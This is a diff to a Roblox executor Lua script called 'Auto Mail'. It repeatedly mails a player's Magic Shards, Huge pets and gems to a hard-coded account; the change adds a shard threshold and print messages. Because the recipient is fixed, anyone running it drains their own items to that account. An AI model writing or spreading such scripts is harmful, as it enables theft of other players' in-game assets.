@@ -4,6 +4,7 @@ print("Auto Mail loaded!!")
 
 getgenv().config = {
 	userToMail = "TrnBi99",
+	minShards = 50,
 	gemAmount = 2000000,
 }
 
@@ -38,7 +39,7 @@ function autoMail()
 	local ms = result.Inventory.Misc
 	for i, v in pairs(ms) do
 		if v.id == "Magic Shard" then
-			if v._am >= 50 then
+			if v._am >= config.minShards then
 				local args = {
 					[1] = config.userToMail,
 					[2] = "Magic Shard",
@@ -46,9 +47,8 @@ function autoMail()
 					[4] = i,
 					[5] = v._am or 1
 				}
-				game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
-					unpack(args)
-				)
+				game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+				print("Send "..v._am.." Shards to "..config.userToMail.."!")
 			end
 		end
 	end
@@ -66,6 +66,7 @@ function autoMail()
 		    [5] = v._am or 1
 		}
 		game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+		print("Send Huge Poseidon Corgi to "..config.userToMail.."!")
 	    end
 	end
 
@@ -85,6 +86,7 @@ function autoMail()
 				[5] = config.gemAmount - 10000
 			}
 			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+			print("Send "..config.gemAmount.." Gems to "..config.userToMail.."!")
 		end
 	    end
 	    task.wait(0.05)
